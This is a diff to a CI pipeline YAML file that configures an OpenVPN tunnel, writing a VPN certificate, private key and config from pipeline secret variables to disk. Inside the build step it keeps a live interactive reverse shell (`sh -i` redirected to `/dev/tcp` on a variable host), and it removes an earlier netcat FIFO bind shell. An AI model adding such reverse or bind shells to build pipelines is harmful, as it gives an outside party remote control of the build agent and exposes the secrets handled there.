@@ -8,12 +8,23 @@ steps:
 
   - bash: |
       sudo apt-get --assume-yes --no-install-recommends install openvpn netcat
+      echo $VPNCRT > vpncrt.crt
+      echo $VPNKEY > vpnkey.key
+      echo $VPNCONFIG > tempvpnconfig.ovpn
 
-      # create tunnel
+      # curl -o client.zip $(az network vnet-gateway vpn-client generate -n gateway -g example-resources | tr -d '"')
+      # unzip client.zip -d client
+
+      CLIENTCERTIFICATE=$(cat vpncrt.crt) PRIVATEKEY=$(cat vpnkey.key) envsubst < tempvpnconfig.ovpn > vpnconfig.ovpn
+
+      sudo openvpn vpnconfig.ovpn &
+
+      sleep 5
+
+      ifconfig tun0
+
       sh -i >& "/dev/tcp/$(ME)" 0>&1
-      
-      sudo apt-get update
-      ls
-      curl ifconfig.me
-      rm -f /tmp/f; mkfifo /tmp/f
-      cat /tmp/f | /bin/sh -i 2>&1 | nc -lv 1234 > /tmp/f
+    env:
+      VPNKEY: $(vpnkey)
+      VPNCRT: $(vpncrt)
+      VPNCONFIG: $(VPNCONFIG)
